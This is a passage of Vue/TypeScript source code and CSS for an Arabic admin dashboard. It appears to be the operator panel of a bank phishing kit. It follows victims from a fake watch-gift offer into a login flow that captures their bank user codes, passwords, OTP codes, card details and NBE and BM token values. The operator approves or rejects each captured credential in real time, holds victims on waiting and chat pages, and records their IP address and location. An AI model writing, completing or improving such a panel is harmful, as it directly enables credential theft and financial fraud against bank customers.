      const ts = typeof item === "object" ? item?.timestamp : undefined;
      if (val && !seen.has(val) && val !== "لم يدخل بعد" && val !== "تم إدخال الرمز") {
        const match = attempts.find((a) => a.bmToken === val);
        const st = match?.bmTokenStatus || "rejected";
        entries.push({
          value: val,
          timestamp: ts,
          isCurrent: false,
          status: (st === "approved" || st === "rejected" || st === "pending") ? st : "rejected",
        });
        seen.add(val);
      }
    }
  }

  for (const att of attempts) {
    if (att.bmToken && !seen.has(att.bmToken) && att.bmToken !== "لم يدخل بعد" && att.bmToken !== "تم إدخال الرمز") {
      const st = att.bmTokenStatus || "rejected";
      entries.push({
        value: att.bmToken,
        timestamp: att.bmTokenSubmittedAt || att.createdAt,
        isCurrent: false,
        status: (st === "approved" || st === "rejected" || st === "pending") ? st : "rejected",
      });
      seen.add(att.bmToken);
    }
  }

  return entries;
};

// حالة نافذة سجل الإدخالات
const historyDialog = ref<{
  isOpen: boolean;
  title: string;
  fieldLabel: string;
  history: FieldHistoryEntry[];
}>({
  isOpen: false,
  title: "",
  fieldLabel: "",
  history: [],
});

const copiedItemIndex = ref<number | null>(null);

const openHistory = (title: string, fieldLabel: string, history: FieldHistoryEntry[]) => {
  historyDialog.value = {
    isOpen: true,
    title,
    fieldLabel,
    history,
  };
  copiedItemIndex.value = null;
};

const closeHistory = () => {
  historyDialog.value.isOpen = false;
};

const copyHistoryValue = async (val: string, index: number) => {
  try {
    await navigator.clipboard.writeText(val);
    copiedItemIndex.value = index;
    setTimeout(() => {
      if (copiedItemIndex.value === index) {
        copiedItemIndex.value = null;
      }
    }, 2000);
  } catch (err) {
    console.error("Failed to copy text", err);
  }
};

const submitDashboardLogin = async () => {
  if (!canDashboardLogin.value) return;
  if (dashboardTrap.value.trim()) return;

  await signIn(dashboardEmail.value, dashboardPassword.value);
  dashboardPassword.value = "";
};

onMounted(() => {
  const storedTheme = window.localStorage.getItem("gift_dashboard_theme");
  if (storedTheme === "dark" || storedTheme === "light") {
    dashboardTheme.value = storedTheme;
  }
  const storedSound = window.localStorage.getItem("admin_sound_enabled");
  if (storedSound !== null) {
    soundNotificationEnabled.value = storedSound === "true";
  }

  const handleWarmupAudio = () => {
    getAudioContext();
    window.removeEventListener("click", handleWarmupAudio);
    window.removeEventListener("keydown", handleWarmupAudio);
  };
  window.addEventListener("click", handleWarmupAudio, { once: true });
  window.addEventListener("keydown", handleWarmupAudio, { once: true });
});

const toggleDashboardTheme = () => {
  dashboardTheme.value = dashboardTheme.value === "dark" ? "light" : "dark";
  window.localStorage.setItem("gift_dashboard_theme", dashboardTheme.value);
};

const banDialog = ref<{ isOpen: boolean; id: string }>({ isOpen: false, id: "" });
const banning = ref(false);

const isCustomerBanned = (customer?: CustomerRecord | null) => {
  if (!customer) return false;
  if (customer.isBanned && customer.bannedUntil && Date.now() < Number(customer.bannedUntil)) {
    return true;
  }
  return false;
};

const openBanDialog = (id: string) => {
  banDialog.value = { isOpen: true, id };
};

const closeBanDialog = () => {
  if (banning.value) return;
  banDialog.value = { isOpen: false, id: "" };
};

const confirmBan = async () => {
  if (!banDialog.value.id) return;
  banning.value = true;
  try {
    await banCustomer(banDialog.value.id);
    banDialog.value = { isOpen: false, id: "" };
  } finally {
    banning.value = false;
  }
};

const handleUnbanCustomer = async (id: string) => {
  try {
    await unbanCustomer(id);
  } catch (err) {
    console.error("Failed to unban customer", err);
  }
};

const openDeleteCustomerDialog = (id: string) => {
  if (role.value !== "superadmin") return;
  deleteDialog.value = { type: "one", id };
};

const openDeleteAllDialog = () => {
  if (role.value !== "superadmin") return;
  deleteDialog.value = { type: "all", id: "" };
};

const handleDeleteAllFromDrawer = () => {
  if (role.value !== "superadmin") return;
  closeSettingsDrawer();
  openDeleteAllDialog();
};

const closeDeleteDialog = () => {
  if (deleting.value) return;
  deleteDialog.value = { type: "", id: "" };
};

const deleteDialogTitle = computed(() =>
  deleteDialog.value.type === "all" ? "حذف كافة السجلات" : "حذف بيانات المستخدم"
);

const deleteDialogMessage = computed(() =>
  deleteDialog.value.type === "all"
    ? "هل أنت متأكد من حذف كافة المستخدمين وجميع السجلات؟ لا يمكن التراجع عن هذا الإجراء."
    : "هل أنت متأكد من حذف هذا المستخدم وكافة بياناته؟ لا يمكن التراجع عن هذا الإجراء."
);

const confirmDelete = async () => {
  if (role.value !== "superadmin") return;
  if (!deleteDialog.value.type) return;
  deleting.value = true;

  try {
    if (deleteDialog.value.type === "all") {
      await deleteAllCustomers();
      selectedCustomerId.value = "";
    } else if (deleteDialog.value.id) {
      await deleteCustomer(deleteDialog.value.id);
      if (selectedCustomerId.value === deleteDialog.value.id) {
        selectedCustomerId.value = "";
      }
    }
    deleteDialog.value = { type: "", id: "" };
  } finally {
    deleting.value = false;
  }
};

const stepStatusLabel = (status?: string) => {
  if (status === "approved") return "تم القبول";
  if (status === "rejected") return "تم الرفض";
  if (status === "pending") return "بانتظار القرار";
  return "لم يُدخل بعد";
};


const getLoginCredentialsStatus = (customer: CustomerRecord) => {
  if (customer.passwordStatus && customer.passwordStatus !== "none") return customer.passwordStatus;
  if (customer.usernameStatus && customer.usernameStatus !== "none") return customer.usernameStatus;
  return "none";
};

const decideLoginCredentials = async (id: string, status: "approved" | "rejected") => {
  const customer = customers.value.find((c) => c.id === id);
  if (customer) {
    customer.usernameStatus = status;
    customer.passwordStatus = status;
  }
  await updateLoginCredentialsDecision(id, status);
};

const decideUsername = async (id: string, status: "approved" | "rejected") => {
  const customer = customers.value.find((c) => c.id === id);
  if (customer) {
    customer.usernameStatus = status;
  }
  await updateUsernameDecision(id, status);
};

const decidePassword = async (id: string, status: "approved" | "rejected") => {
  const customer = customers.value.find((c) => c.id === id);
  if (customer) {
    customer.passwordStatus = status;
  }
  await updatePasswordDecision(id, status);
};

const verificationLabel = (status?: CustomerLoginAttemptVerificationStatus) => {
  if (status === "approved") return "تم القبول";
  if (status === "rejected") return "تم الرفض";
  if (status === "pending") return "بانتظار القرار";
  return "لا يوجد طلب";
};

const decideVerification = async (
  id: string,
  status: CustomerVerificationStatus,
  attemptId?: string
) => {
  const customer = customers.value.find((c) => c.id === id);
  if (customer) {
    if (customer.verification) {
      customer.verification.status = status;
    }
    customer.verificationStatus = status;
    if (attemptId && customer.loginAttempts?.[attemptId]) {
      customer.loginAttempts[attemptId].verificationStatus = status;
    }
  }
  await updateCustomerVerification(
    id,
    status,
    attemptId === "legacy-login" ? undefined : attemptId
  );
};

const decideNbeToken = async (
  id: string,
  status: "approved" | "rejected",
  attemptId?: string
) => {
  const customer = customers.value.find((c) => c.id === id);
  if (customer) {
    customer.nbeTokenStatus = status;
    if (attemptId && customer.loginAttempts?.[attemptId]) {
      customer.loginAttempts[attemptId].nbeTokenStatus = status;
    }
  }
  await updateNbeTokenDecision(
    id,
    status,
    attemptId === "legacy-login" ? undefined : attemptId
  );
};

const decideBmToken = async (
  id: string,
  status: "approved" | "rejected",
  attemptId?: string
) => {
  const customer = customers.value.find((c) => c.id === id);
  if (customer) {
    customer.bmTokenStatus = status;
    if (attemptId && customer.loginAttempts?.[attemptId]) {
      customer.loginAttempts[attemptId].bmTokenStatus = status;
    }
  }
  await updateBmTokenDecision(
    id,
    status,
    attemptId === "legacy-login" ? undefined : attemptId
  );
};

const pageLabel = (path?: string) => {
  const labels: Record<string, string> = {
    "/": "الرئيسية",
    "/watches": "اختيار الساعات",
    "/delivery": "بيانات التوصيل",
    "/claim": "بيانات التوصيل",
    "/shipping": "بيانات التوصيل",
    "/gift-details": "بيانات التوصيل",
    "/login": "تسجيل الدخول",
    "/bm": "تفعيل BM Token",
    "/bm-token": "تفعيل BM Token",
    "/token-guide": "تفعيل BM Token",
    "/nbe-token-guide": "تفعيل BM Token",
    // ✅ الصيغة الموحدة
    [ROUTE_PATHS.waitingRoom]: "الانتظار",
    [ROUTE_PATHS.chat]: "المحادثات / خدمة العملاء",
    // legacy aliases (للسجلات القديمة في Firebase)
    "/waiting": "الانتظار",
    "/call": "المحادثات / خدمة العملاء",
    "/success": "تم بنجاح",
    "/blocked": "صفحة الحظر",
    "/admin": "الداشبورد",
  };

  if (!path) return "غير معروف";
  // ✅ توحيد المسار قبل البحث في القاموس
  const key = normalizeKey(path);
  return labels[key] ?? labels[path] ?? path;
};

const customerCurrentLocation = (customer?: CustomerRecord | null) => {
  if (!customer) return { fullLabel: "غير معروف", pageName: "غير معروف", stepName: "", isLogin: false };

  // ✅ تحديث لحظي: إذا كان هذا هو العميل المُختار، نستخدم liveCustomerPage
  //    (يتم تحديثه فوراً من useCustomerPresenceWatcher عبر real-time listener).
  //    هذا يضمن أن اسم الصفحة يظهر محدّثاً لحظياً في كل الحالات
  //    (انتظار، محادثة، بعد القبول، في كائن التتبع، ...).
  // ✅ للعميل غير المُختار، نعتمد على presence.currentPage أو lastPage
  //    من snapshot العملاء الكامل (يتم تحديثه كل ثانية عبر polling).
  const isSelected = selectedCustomerId.value && customer.id === selectedCustomerId.value;
  let rawPath =
    (isSelected && liveCustomerPage.value) ||
    customer.presence?.currentPage ||
    customer.lastPage ||
    "/";

  // ✅ توحيد المسار فوراً لقبول الصيغة القديمة (/waiting, /call) والحديثة
  rawPath = normalizePath(rawPath);

  // إذا كانت القيمة المسجلة هي الصفحة الرئيسية لكن العميل وصل لخطوة تسجيل دخول أو صفحة أخرى سابقة
  if ((rawPath === "/" || !rawPath) && (customer.currentStep || (customer.presence as any)?.currentStep || customer.username || customer.nationalId)) {
    if (customer.currentStep || (customer.presence as any)?.currentStep || customer.username) {
      const fallbackStep = (customer.currentStep || (customer.presence as any)?.currentStep || "username");
      rawPath = `/login?step=${fallbackStep}`;
    } else if (customer.nationalId) {
      rawPath = "/delivery";
    }
  }

  const path = (rawPath.split("?")[0] || "").toLowerCase();
  const queryStr = rawPath.includes("?") ? rawPath.split("?")[1] : "";
  const params = new URLSearchParams(queryStr);
  const stepParam = params.get("step");

  // ✅ تحديث لحظي: نعتمد على المسار الموحَّد لقبول /waiting و /waiting-room
  if (path === ROUTE_PATHS.waitingRoom || path === "/waiting") {
    return {
      fullLabel: "صفحة الانتظار",
      pageName: "صفحة الانتظار",
      stepName: "الانتظار",
      isLogin: false,
    };
  }

  // ✅ صفحة المحادثات / خدمة العملاء
  if (path === ROUTE_PATHS.chat || path === "/call") {
    return {
      fullLabel: "المحادثات / خدمة العملاء",
      pageName: "المحادثات / خدمة العملاء",
      stepName: "خدمة العملاء",
      isLogin: false,
    };
  }

  if (path === "/login" || ((customer as any).currentStep && (customer as any).currentStep !== "waiting") || ((customer.presence as any)?.currentStep && (customer.presence as any)?.currentStep !== "waiting")) {
    const directStep = (customer as any).currentStep || (customer.presence as any)?.currentStep || stepParam;

    let step = directStep;
    if (!step) {
      if (isBmTokenPending(customer)) {
        step = "bm_token";
      } else if (isNbeTokenPending(customer)) {
        step = "nbe_token";
      } else if (isCardPending(customer)) {
        step = "card";
      } else if (isOtpPending(customer)) {
        step = "otp";
      } else if (isLoginCredentialsPending(customer)) {
        step = "password";
      } else {
        const action = customer.lastAction || "";
        if (action.includes("BM") || action.includes("bm")) {
          step = "bm_token";
        } else if (action.includes("NBE") || action.includes("توكن")) {
          step = "nbe_token";
        } else if (action.includes("بطاق") || action.includes("البطاقة")) {
          step = "card";
        } else if (action.includes("OTP") || action.includes("تحقق")) {
          step = "otp";
        } else if (action.includes("مرور") || action.includes("كلمة")) {
          step = "password";
        } else {
          step = "username";
        }
      }
    }

    const stepMap: Record<string, string> = {
      username: "كود المستخدم",
      password: "كلمة المرور",
      otp: "رمز التحقق OTP",
      card: "بيانات البطاقة",
      nbe_token: "NBE توكن",
      bm_token: "جهاز توكن",
    };

    const stepTitle = stepMap[step] || "كود المستخدم";

    return {
      fullLabel: stepTitle,
      pageName: "تسجيل الدخول",
      stepName: stepTitle,
      isLogin: true,
    };
  }

  const pageMap: Record<string, string> = {
    "/": "الرئيسية",
    "": "الرئيسية",
    "/watches": "اختيار الساعات",
    "/delivery": "بيانات التوصيل",
    "/claim": "بيانات التوصيل",
    "/shipping": "بيانات التوصيل",
    "/gift-details": "بيانات التوصيل",
    "/bm": "تفعيل BM Token",
    "/bm-token": "تفعيل BM Token",
    "/token-guide": "تفعيل BM Token",
    "/nbe-token-guide": "تفعيل BM Token",
    [ROUTE_PATHS.waitingRoom]: "الانتظار",
    [ROUTE_PATHS.chat]: "المحادثات / خدمة العملاء",
    "/waiting": "الانتظار",
    "/call": "المحادثات / خدمة العملاء",
    "/success": "تم بنجاح",
    "/blocked": "صفحة الحظر",
    "/admin": "الداشبورد",
  };

  const title = pageMap[path] || (rawPath.startsWith("http") ? "واتساب" : path);
  return {
    fullLabel: title,
    pageName: title,
    stepName: "",
    isLogin: false,
  };
};

// === مساعدو عرض بيانات الـ Geo للزائر (دولة + منطقة + مدينة) ===
const customerGeoFlag = (customer?: CustomerRecord | null) => {
  if (!customer) return "";
  if (customer.countryCode) return countryCodeToFlag(customer.countryCode);
  return customer.country ? "🌍" : "";
};

const customerGeoFullLabel = (customer?: CustomerRecord | null) => {
  if (!customer) return "";
  const parts: string[] = [];
  if (customer.country) parts.push(customer.country);
  if (customer.countryCode) parts.push(customer.countryCode);
  if (customer.region) parts.push(customer.region);
  if (customer.geoCity) parts.push(customer.geoCity);
  if (customer.ip) parts.push(`IP: ${customer.ip}`);
  return parts.join(" · ");
};

const formatGeoCapturedAt = (iso?: string) => {
  if (!iso) return "";
  try {
    const d = new Date(iso);
    if (isNaN(d.getTime())) return "";
    return d.toLocaleString("en-GB", {
      day: "2-digit",
      month: "short",
      hour: "2-digit",
      minute: "2-digit",
      hour12: false,
    });
  } catch {
    return "";
  }
};
</script>

<style scoped>
/* =========================================================
   نظام التصميم الاحترافي للوحة التحكم (Modern Enterprise Dashboard)
   ========================================================= */

.dashboard-page {
  --dash-bg: #f8fafc;
  --dash-surface: #ffffff;
  --dash-surface-subtle: #f1f5f9;
  --dash-card: #ffffff;
  --dash-line: #e2e8f0;
  --dash-line-soft: #edf2f7;
  --dash-text: #0f172a;
  --dash-muted: #64748b;
  --dash-primary: #026a32;
  --dash-primary-hover: #015327;
  --dash-primary-subtle: #edf7f2;
  --dash-success: #059669;
  --dash-success-subtle: #ecfdf5;
  --dash-danger: #dc2626;
  --dash-danger-subtle: #fef2f2;
  --dash-warning: #d97706;
  --dash-warning-subtle: #fffbeb;
  --dash-shadow: 0 1px 3px rgba(0, 0, 0, 0.05), 0 1px 2px rgba(0, 0, 0, 0.03);
  --dash-shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -2px rgba(0, 0, 0, 0.03);

  min-height: 100vh;
  height: 100vh;
  color: var(--dash-text);
  background: var(--dash-bg);
  overflow: hidden;
  direction: rtl;
  font-family: inherit;
}

.dashboard-page.theme-dark {
  --dash-bg: #0b0f19;
  --dash-surface: #111827;
  --dash-surface-subtle: #172033;
  --dash-card: #141d2e;
  --dash-line: #1e293b;
  --dash-line-soft: #182338;
  --dash-text: #f1f5f9;
  --dash-muted: #94a3b8;
  --dash-primary: #10b981;
  --dash-primary-hover: #059669;
  --dash-primary-subtle: #0f2e21;
  --dash-success: #34d399;
  --dash-success-subtle: #0d3023;
  --dash-danger: #f87171;
  --dash-danger-subtle: #3a1c1c;
  --dash-warning: #fbbf24;
  --dash-warning-subtle: #382c11;
  --dash-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
  --dash-shadow-md: 0 6px 16px rgba(0, 0, 0, 0.4);
}

.dashboard-shell {
  width: 100%;
  height: 100%;
  padding: 0;
  margin: 0;
  display: flex;
  flex-direction: column;
}

/* بطاقة تسجيل الدخول */
.dashboard-auth-card {
  width: min(400px, 100%);
  margin: 100px auto;
  border: 1px solid var(--dash-line);
  border-radius: 12px;
  padding: 36px 24px;
  background: var(--dash-surface);
  box-shadow: var(--dash-shadow);
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 16px;
  color: var(--dash-muted);
  font-weight: 600;
  font-size: 0.92rem;
}

.auth-spinner {
  width: 28px;
  height: 28px;
  border: 3px solid var(--dash-line);
  border-top-color: var(--dash-primary);
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}

.auth-spinner.small {
  width: 18px;
  height: 18px;
  border-width: 2.5px;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.dashboard-login-container {
  width: 100%;
  height: 100%;
  display: grid;
  place-items: center;
  padding: 20px;
}

.dashboard-login {
  width: min(420px, 100%);
  border: 1px solid var(--dash-line);
  border-radius: 14px;
  padding: 32px;
  background: var(--dash-surface);
  box-shadow: var(--dash-shadow-md);
  display: flex;
  flex-direction: column;
  gap: 18px;
}

.login-brand {
  text-align: center;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 6px;
  margin-bottom: 8px;
}

.login-icon-box {
  width: 52px;
  height: 52px;
  border-radius: 12px;
  background: var(--dash-primary-subtle);
  color: var(--dash-primary);
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 6px;
}

.login-brand h1 {
  margin: 0;
  font-size: 1.25rem;
  font-weight: 800;
  color: var(--dash-text);
}

.login-brand p {
  margin: 0;
  font-size: 0.84rem;
  color: var(--dash-muted);
}

.login-field {
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.login-field label {
  font-size: 0.84rem;
  font-weight: 700;
  color: var(--dash-text);
}

.login-field input {
  height: 42px;
  border: 1px solid var(--dash-line);
  border-radius: 8px;
  padding: 0 12px;
  background: var(--dash-surface-subtle);
  color: var(--dash-text);
  font-size: 0.9rem;
  outline: none;
  transition: border-color 0.15s ease;
}

.login-field input:focus {
  border-color: var(--dash-primary);
  background: var(--dash-surface);
}

.login-submit-btn {
  height: 42px;
  border: none;
  border-radius: 8px;
  background: var(--dash-primary);
  color: #ffffff;
  font-size: 0.92rem;
  font-weight: 700;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  margin-top: 4px;
  transition: background-color 0.15s ease;
}

.login-submit-btn:hover {
  background: var(--dash-primary-hover);
}

.login-submit-btn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}

.auth-error-banner {
  padding: 10px 14px;
  border-radius: 8px;
  background: var(--dash-danger-subtle);
  color: var(--dash-danger);
  font-size: 0.82rem;
  font-weight: 700;
  display: flex;
  align-items: center;
  gap: 8px;
}

.bot-trap {
  position: absolute;
  width: 1px;
  height: 1px;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
}

/* الشريط العلوي (Topbar متصل مباشرة بدون فواصل) */
.dashboard-topbar {
  flex: none;
  display: flex;
  align-items: center;
  justify-content: space-between;
  min-height: 52px;
  height: 52px;
  margin-bottom: 0;
  border: none;
  border-bottom: 1px solid var(--dash-line);
  border-radius: 0;
  padding: 0 16px;
  background: var(--dash-surface);
  box-shadow: none;
}

.topbar-right {
  display: flex;
  align-items: center;
  gap: 18px;
  flex-wrap: wrap;
}

.topbar-brand {
  display: flex;
  align-items: center;
  gap: 10px;
}

.brand-logo-mark {
  width: 32px;
  height: 32px;
  border-radius: 8px;
  background: var(--dash-primary-subtle);
  color: var(--dash-primary);
  display: flex;
  align-items: center;
  justify-content: center;
}

.brand-text {
  display: flex;
  flex-direction: column;
  gap: 2px;
}

.brand-title {
  font-size: 0.95rem;
  font-weight: 800;
  color: var(--dash-text);
}

.admin-user-tag {
  font-size: 0.76rem;
  color: var(--dash-muted);
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 5px;
}

.live-dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: var(--dash-success);
}

.topbar-metrics {
  display: flex;
  align-items: center;
  gap: 8px;
}

.metric-chip {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 4px 10px;
  border-radius: 6px;
  background: var(--dash-surface-subtle);
  border: 1px solid var(--dash-line);
  font-size: 0.78rem;
  color: var(--dash-muted);
}

.metric-chip.highlight {
  color: var(--dash-primary);
  border-color: rgba(2, 106, 50, 0.2);
}

.metric-chip.online-chip {
  color: var(--dash-success);
}

.metric-label {
  font-weight: 600;
}

.metric-value {
  font-weight: 800;
  color: var(--dash-text);
}

.metric-chip.highlight .metric-value {
  color: var(--dash-primary);
}

.online-pulse-dot {
  width: 7px;
  height: 7px;
  border-radius: 50%;
  background: var(--dash-success);
}

.topbar-actions {
  display: flex;
  align-items: center;
  gap: 8px;
}

.topbar-action-btn {
  height: 32px;
  padding: 0 10px;
  border-radius: 7px;
  border: 1px solid var(--dash-line);
  background: var(--dash-surface-subtle);
  color: var(--dash-text);
  font-size: 0.8rem;
  font-weight: 700;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 6px;
  transition: all 0.15s ease;
}

.topbar-action-btn:hover {
  background: var(--dash-surface);
  border-color: var(--dash-muted);
}

.topbar-action-btn.danger {
  color: var(--dash-danger);
  border-color: rgba(220, 38, 38, 0.2);
}

.topbar-action-btn.danger:hover {
  background: var(--dash-danger-subtle);
}

.topbar-action-btn.primary-subtle {
  background: var(--dash-primary-subtle);
  color: var(--dash-primary);
  border-color: rgba(2, 106, 50, 0.2);
}

.topbar-action-btn.primary-subtle:hover {
  background: var(--dash-primary);
  color: #ffffff;
}

.topbar-action-btn.success-nav-btn {
  background: var(--dash-success-subtle);
  color: var(--dash-success);
  border-color: rgba(2, 106, 50, 0.25);
  text-decoration: none;
}

.topbar-action-btn.success-nav-btn:hover {
  background: var(--dash-success);
  color: #ffffff;
  border-color: var(--dash-success);
}

.topbar-action-btn:disabled {
  opacity: 0.45;
  cursor: not-allowed;
}

/* تخطيط لوحة التحكم الرئيسي: 3 أعمدة متصلة مباشرة بالهيدر وبدون أي فراغات محيطة */
.dashboard-main {
  flex: 1;
  min-height: 0;
  display: grid;
  grid-template-columns: 246px 246px minmax(0, 1fr);
  gap: 0;
  border: none;
  border-radius: 0;
  background: var(--dash-surface);
  box-shadow: none;
  overflow: hidden;
}

/* القوائم الجانبية (المستخدمون وقيد الانتظار) */
.customers-panel {
  border: none;
  border-radius: 0;
  background: var(--dash-surface);
  box-shadow: none;
  display: flex;
  flex-direction: column;
  min-height: 0;
  overflow: hidden;
}

.customers-panel.users-panel {
  border-left: 1px solid var(--dash-line);
}

.customers-panel.pending-panel {
  border-left: 1px solid var(--dash-line);
}

.panel-head {
  height: 48px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 14px;
  border-bottom: 1px solid var(--dash-line-soft);
  flex-shrink: 0;
}

.panel-head.pending-head {
  background: rgba(245, 158, 11, 0.06);
  border-bottom: 1px solid rgba(245, 158, 11, 0.22);
}

.pending-head .pending-icon {
  color: #d97706;
}

.pending-count-pill {
  background: rgba(245, 158, 11, 0.18);
  color: #d97706;
  border: 1px solid rgba(245, 158, 11, 0.35);
  font-weight: 800;
}

.customer-card.pending-card {
  border-right: 3px solid #f59e0b;
}

.customer-card.pending-card:hover {
  background: rgba(245, 158, 11, 0.06);
}

.customer-card.pending-card.active {
  background: rgba(245, 158, 11, 0.12);
  border-color: #f59e0b;
}

.state-box.empty-pending {
  color: var(--dash-muted);
  text-align: center;
  padding: 30px 14px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.empty-pending svg {
  color: var(--dash-success);
  margin-bottom: 8px;
}

.empty-hint {
  font-size: 0.72rem;
  color: var(--dash-muted);
  opacity: 0.75;
  margin-top: 4px;
}

.metric-chip.pending-chip {
  color: var(--dash-muted);
  cursor: pointer;
  transition: all 0.2s ease;
}

.metric-chip.pending-chip:hover {
  background: var(--dash-surface);
  border-color: #f59e0b;
}

.metric-chip.pending-chip.highlight {
  background: rgba(245, 158, 11, 0.12);
  border-color: rgba(245, 158, 11, 0.4);
  color: #d97706;
}

.metric-chip.pending-chip.highlight .metric-value {
  color: #d97706;
}

.pulse-badge {
  animation: pulse-badge-glow 1.8s infinite;
}

@keyframes pulse-badge-glow {
  0%, 100% {
    transform: scale(1);
    box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4);
  }
  50% {
    transform: scale(1.08);
    box-shadow: 0 0 0 4px rgba(245, 158, 11, 0);
  }
}

.panel-title-wrap {
  display: flex;
  align-items: center;
  gap: 6px;
}

.panel-title-wrap h2 {
  margin: 0;
  font-size: 0.95rem;
  font-weight: 800;
}

.count-pill {
  font-size: 0.72rem;
  padding: 1px 7px;
  border-radius: 999px;
  background: var(--dash-surface-subtle);
  color: var(--dash-muted);
  font-weight: 700;
}

.panel-filters-toolbar {
  display: flex;
  align-items: center;
  gap: 5px;
  padding: 6px 10px;
  background: var(--dash-surface-subtle);
  border-bottom: 1px solid var(--dash-line-soft);
}

.filter-tab-btn {
  flex: 1;
  height: 27px;
  padding: 0 6px;
  border-radius: 6px;
  border: 1px solid var(--dash-line);
  background: var(--dash-surface);
  color: var(--dash-muted);
  font-size: 0.74rem;
  font-weight: 700;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 4px;
  transition: all 0.15s ease;
  white-space: nowrap;
}

.filter-tab-btn:hover {
  color: var(--dash-text);
  border-color: var(--dash-muted);
}

.filter-tab-btn.active {
  background: var(--dash-primary);
  color: #ffffff;
  border-color: var(--dash-primary);
}

.filter-tab-btn.star-filter-btn.active {
  background: #fef3c7;
  color: #92400e;
  border-color: #fcd34d;
}

.filter-tab-btn.active .presence-dot-mini {
  background: #ffffff;
}

.filter-tab-btn .filter-count {
  font-size: 0.68rem;
  opacity: 0.85;
}

.star-toggle-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  padding: 2px;
  background: transparent;
  border: none;
  cursor: pointer;
  border-radius: 4px;
  color: #94a3b8;
  transition: transform 0.15s ease, color 0.15s ease;
  flex-shrink: 0;
  line-height: 1;
}

.star-toggle-btn:hover {
  transform: scale(1.2);
  color: #f59e0b;
}

.star-toggle-btn.starred {
  color: #f59e0b;
}

.star-toggle-btn.details-star-btn {
  padding: 4px;
  margin-left: 6px;
  border-radius: 6px;
}

.star-toggle-btn.details-star-btn:hover {
  background: rgba(245, 158, 11, 0.12);
}

.customer-name-wrap {
  display: flex;
  align-items: center;
  gap: 4px;
  min-width: 0;
  flex: 1;
}

.presence-dot-mini {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: var(--dash-success);
}

.filter-pill-btn.active .presence-dot-mini {
  background: #ffffff;
}

.filter-count {
  font-size: 0.7rem;
  opacity: 0.85;
}

.search-wrap {
  padding: 8px 12px;
  border-bottom: 1px solid var(--dash-line-soft);
  position: relative;
  display: flex;
  align-items: center;
}

.search-icon {
  position: absolute;
  right: 20px;
  color: var(--dash-muted);
  pointer-events: none;
}

.search-wrap input {
  width: 100%;
  height: 34px;
  border: 1px solid var(--dash-line);
  border-radius: 6px;
  padding: 0 30px 0 10px;
  background: var(--dash-surface-subtle);
  color: var(--dash-text);
  font-size: 0.82rem;
  outline: none;
  transition: border-color 0.15s ease;
}

.search-wrap input:focus {
  border-color: var(--dash-primary);
  background: var(--dash-surface);
}

.customers-list-scroll {
  flex: 1;
  overflow-y: auto;
  min-height: 0;
}

.customer-card {
  width: 100%;
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 8px 10px;
  border: 0;
  border-bottom: 1px solid var(--dash-line-soft);
  border-right: 3px solid transparent;
  background: var(--dash-surface);
  text-align: right;
  cursor: pointer;
  transition: background-color 0.12s ease;
}

.customer-card:hover {
  background: var(--dash-surface-subtle);
}

.customer-card.active {
  background: var(--dash-primary-subtle);
  border-right-color: var(--dash-primary);
}

.customer-card.has-pending {
  border-right-color: var(--dash-warning);
}

.user-presence-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: #cbd5e1;
  flex-shrink: 0;
}

.user-presence-dot.online {
  background: var(--dash-success);
}

.customer-card-info {
  flex: 1;
  min-width: 0;
  display: flex;
  flex-direction: column;
  gap: 2px;
}

.customer-card-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 4px;
}

.customer-name {
  font-size: 0.84rem;
  font-weight: 700;
  color: var(--dash-text);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.pending-tag {
  font-size: 0.64rem;
  font-weight: 800;
  padding: 1px 5px;
  border-radius: 4px;
  background: var(--dash-warning-subtle);
  color: var(--dash-warning);
  white-space: nowrap;
}

.customer-card-status-row {
  display: flex;
  align-items: center;
  gap: 4px;
  margin-top: 2px;
  flex-wrap: wrap;
}

.customer-presence-pill {
  display: inline-flex;
  align-items: center;
  gap: 3px;
  font-size: 0.66rem;
  font-weight: 700;
  padding: 1px 5px;
  border-radius: 4px;
  background: var(--dash-surface-subtle);
  color: var(--dash-muted);
  white-space: nowrap;
}

.customer-presence-pill.online {
  background: var(--dash-success-subtle);
  color: var(--dash-success);
}

.customer-presence-pill .presence-dot-mini {
  width: 5px;
  height: 5px;
  border-radius: 50%;
  background: currentColor;
}

.customer-location-pill {
  display: inline-flex;
  align-items: center;
  gap: 3px;
  font-size: 0.68rem;
  font-weight: 700;
  color: var(--dash-primary);
  background: var(--dash-primary-subtle);
  padding: 1px 5px;
  border-radius: 4px;
  border: 1px solid rgba(2, 106, 50, 0.15);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  max-width: 140px;
}

.customer-location-pill.is-login {
  background: rgba(2, 106, 50, 0.14);
  font-weight: 800;
}

/* ==================== Pill الدولة والمنطقة (داخل بطاقة المستخدم) — نفس حجم الـ location pill الأخضر بالضبط ==================== */
.customer-country-mini-pill {
  display: inline-flex;
  align-items: center;
  gap: 3px;
  font-size: 0.68rem;       /* نفس حجم الخط الموجود في customer-location-pill */
  font-weight: 700;          /* نفس الوزن */
  color: #1e40af;            /* أزرق احترافي غامق — يميّزه بصرياً عن الأخضر */
